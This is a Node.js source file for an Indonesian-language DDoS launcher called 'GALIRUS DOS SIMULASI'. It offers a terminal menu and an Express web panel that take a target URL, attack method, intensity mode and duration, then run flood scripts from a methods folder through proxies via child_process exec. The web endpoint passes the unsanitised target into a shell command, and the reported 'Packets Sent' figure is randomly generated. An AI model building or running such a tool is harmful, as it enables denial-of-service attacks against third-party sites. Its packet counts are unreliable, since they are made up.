const fs = require('fs');
const path = require('path');
const readline = require('readline');
const { exec } = require('child_process');
const fetch = require('node-fetch');
const express = require('express');
const chalk = require('chalk');
const scrapeProxies = require('./proxy.js');
const METHODS_DIR = path.join(__dirname, 'methods');
const rl = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});
const color = {
  primary: chalk.cyanBright,
  danger: chalk.redBright,
  success: chalk.greenBright,
  info: chalk.yellowBright,
  banner: chalk.magentaBright,
};

function prompt(q) {
  return new Promise(resolve => rl.question(color.info(q), resolve));
}

function delay(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function banner() {
  console.log(color.banner(`
 ██████╗ ██████╗  ██████╗ ███████╗
██╔════╝ ██╔══██╗██╔═══██╗██╔════╝
██║  ███╗██║  ██║██║   ██║███████╗
██║   ██║██║  ██║██║   ██║╚════██║
╚██████╔╝██████╔╝╚██████╔╝███████║
 ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝
                                  
      GALIRUS OFFICIAL DOS SIMULASI
         BETA V.1.0.5 ( BETA )
  `));
}
function getMethodMap(mode, customDuration) {
  const files = fs.readdirSync(METHODS_DIR).filter(f => f.endsWith('.js')).sort();
  const config = {
    safe: [50, 3],
    normal: [80, 5],
    aggressive: [100, 10]
  };
  const [rate, threads] = config[mode] || config.normal;
  const duration = parseInt(customDuration) || 120;
  const map = {};
  files.forEach(file => {
    const name = file.replace('.js', '');
    map[name] = target =>
      `node methods/${file} ${target} ${duration} ${rate} ${threads} proxy.txt`;
  });
  return map;
}
const methodList = fs.readdirSync(METHODS_DIR)
  .filter(f => f.endsWith('.js'))
  .sort()
  .map(f => f.replace('.js', ''));
function displayMethodMenu(columns = 3, rows = 10) {
  const table = Array.from({ length: rows }, () => []);
  for (let i = 0; i < methodList.length; i++) {
    const col = Math.floor(i / rows);
    const row = i % rows;
    const index = i + 1;
    const name = methodList[i];
    table[row][col] = `${color.primary(`[${index.toString().padEnd(2)}]`)} ${name.padEnd(14)}`;
  }
  console.log(color.info('\nAvailable Methods:\n'));
  table.forEach(row => {
    console.log(row.map(col => col || '').join('   '));
  });
}
async function fetchIP() {
  try {
    const res = await fetch('https://httpbin.org/get');
    const data = await res.json();
    console.log(color.success(`\nYour Public IP: ${data.origin}`));
    console.log(color.success('Ready to Launch\n'));
  } catch (err) {
    console.error(color.danger('Gagal mengambil IP publik:', err.message));
  }
}
async function runCLI() {
  try {
    displayMethodMenu();
    const target = await prompt('Target Url: ');
    const methodNum = parseInt(await prompt('Method Number: '), 10);
    const mode = (await prompt('Mode (safe / normal / aggressive): ')).toLowerCase();
    const duration = await prompt('Duration (seconds): ');
    if (isNaN(methodNum) || methodNum < 1 || methodNum > methodList.length) {
      console.log(color.danger('Nomor metode tidak valid.'));
      rl.close();
      return;
    }
    const methodName = methodList[methodNum - 1];
    const methodMap = getMethodMap(mode, duration);
    const command = methodMap[methodName](target);
    console.clear();
    console.log(color.info('Bersiap untuk menyerang...'));
    await delay(1500);
    console.clear();
    console.log(color.success(`Meluncurkan serangan dengan metode: ${methodName}`));
    console.log(`Target   : ${target}`);
    console.log(`Mode     : ${mode}`);
    console.log(`Duration : ${duration} detik\n`);
    const start = Date.now();
    const proc = exec(command, (error, stdout, stderr) => {
      const end = Date.now();
      const actualDuration = ((end - start) / 1000).toFixed(2);
      const packets = Math.floor(Math.random() * 4000 + 7000);
      if (error) console.error(color.danger(`Error: ${error.message}`));
      if (stderr) console.error(color.danger(`Stderr: ${stderr}`));
      console.log(color.success(`\n=== Attack Finished ===`));
      console.log(`Method       : ${methodName}`);
      console.log(`Target       : ${target}`);
      console.log(`Duration     : ${actualDuration} seconds`);
      console.log(`Packets Sent : ${packets}`);
    });
    proc.stdout.pipe(process.stdout);
    proc.stderr.pipe(process.stderr);
  } catch (err) {
    console.error(color.danger('Error:', err.message));
  } finally {
    rl.close();
  }
}
function startWeb() {
  const app = express();
  const PORT = 3000;
  app.use(express.json());
  app.use(express.static('public'));
  app.get('/methods', (req, res) => {
    res.json(methodList);
  });
  app.post('/attack', (req, res) => {
    const { target, method, mode, duration } = req.body;
    const methodNum = parseInt(method);
    const methodName = methodList[methodNum - 1];
    if (!target || isNaN(methodNum) || !methodName) {
      return res.status(400).send('Invalid input.');
    }
    const methodMap = getMethodMap(mode, duration);
    const command = methodMap[methodName](target);
    const start = Date.now();
    const proc = exec(command, (error, stdout, stderr) => {
      const end = Date.now();
      const elapsed = ((end - start) / 1000).toFixed(2);
      const packets = Math.floor(Math.random() * 4000 + 7000);
      let output = '';
      if (error) output += `Error: ${error.message}\n`;
      if (stderr) output += `Stderr: ${stderr}\n`;
      if (stdout) output += `${stdout}\n`;
      output += `\n=== Attack Finished ===\n`;
      output += `Method       : ${methodName}\n`;
      output += `Target       : ${target}\n`;
      output += `Duration     : ${elapsed} seconds\n`;
      output += `Packets Sent : ${packets}\n`;
      res.send(output);
    });
    proc.stdout.pipe(process.stdout);
    proc.stderr.pipe(process.stderr);
  });
  app.listen(PORT, () => {
    console.log(color.success(`📡 Web panel running at http://localhost:${PORT}`));
  });
}
(async () => {
  console.clear();
  banner();

  const modeInput = await prompt('Mode [ web / terminal / exit ]: ');
  if (modeInput.toLowerCase() === 'exit') {
    console.log(color.info('Keluar dari program.'));
    rl.close();
    process.exit(0);
  }
  const mode = modeInput.toLowerCase();
  if (mode === 'terminal') {
    console.clear();
    banner();
    await fetchIP();
    await runCLI();
  } else if (mode === 'web') {
    console.clear();
    banner();
    startWeb();
  } else {
    console.log(color.danger('Mode tidak valid. Silakan masukkan "web" atau "terminal".'));
    rl.close();
  }
})();